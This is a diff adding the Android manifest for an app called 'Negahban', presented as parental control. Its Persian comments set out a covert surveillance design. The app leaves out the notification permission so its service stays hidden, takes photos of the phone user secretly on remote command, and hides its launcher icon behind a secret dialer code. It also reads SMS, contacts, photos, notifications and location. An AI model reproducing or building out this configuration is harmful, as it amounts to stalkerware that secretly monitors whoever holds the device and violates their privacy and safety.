@@ -1,0 +1,125 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- POST_NOTIFICATIONS عمداً درخواست نمی‌شود: در اندروید ۱۳+ نوتیف سرویس به‌کل مخفی می‌شود -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission
+        android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission
+        android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <!-- برای روشن ماندن پایش حتی وقتی صفحه گوشی خاموش است -->
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+
+    <!-- گزارش پیامک‌ها در پنل والدین -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <!-- گزارش مخاطبین در پنل والدین -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <!-- گزارش گالری در پنل والدین -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <!-- عکس‌برداری مخفیانه از کاربر گوشی به فرمان پنل والدین -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <!-- نمایش موقعیت روی نقشه پنل -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- قابلیت‌های سخت‌افزاری اختیاری؛ روی گوشی‌های بدون این قابلیت‌ها هم نصب می‌شود -->
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+    <uses-feature android:name="android.hardware.location" android:required="false" />
+
+    <application
+        android:name=".NegahbanApp"
+        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:usesCleartextTraffic="true"
+        android:theme="@style/Theme.Negahban">
+
+        <!-- اکتیویتی اصلی؛ آیکون لانچر از طریق LauncherAlias مدیریت می‌شود تا
+             بتوان برنامه را از منو مخفی کرد بدون اینکه سرویس‌ها از کار بیفتند -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:windowSoftInputMode="adjustResize" />
+
+        <!-- آیکون لانچر؛ هنگام «مخفی‌سازی» همین کامپوننت غیرفعال می‌شود -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:label="@string/app_name"
+            android:targetActivity=".MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity
+            android:name=".LockActivity"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:launchMode="standard"
+            android:taskAffinity=""
+            android:theme="@style/Theme.Negahban" />
+
+        <service
+            android:name=".service.WatchdogService"
+            android:exported="false"
+            android:foregroundServiceType="specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="Exemptions parental control usage monitoring and app lock enforcement" />
+        </service>
+
+        <!-- گوش دادن به اعلان‌ها برای گزارش در پنل (کاربر از تنظیمات سیستم فعالش می‌کند) -->
+        <service
+            android:name=".service.NotificationCollector"
+            android:exported="false"
+            android:label="نگهبان — دسترسی اعلان"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <receiver
+            android:name=".service.BootReceiver"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- باز کردن برنامه با شماره‌گیری *#*#5678#*#* (وقتی آیکون مخفی است) -->
+        <receiver
+            android:name=".service.SecretCodeReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="5678" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+
+</manifest>
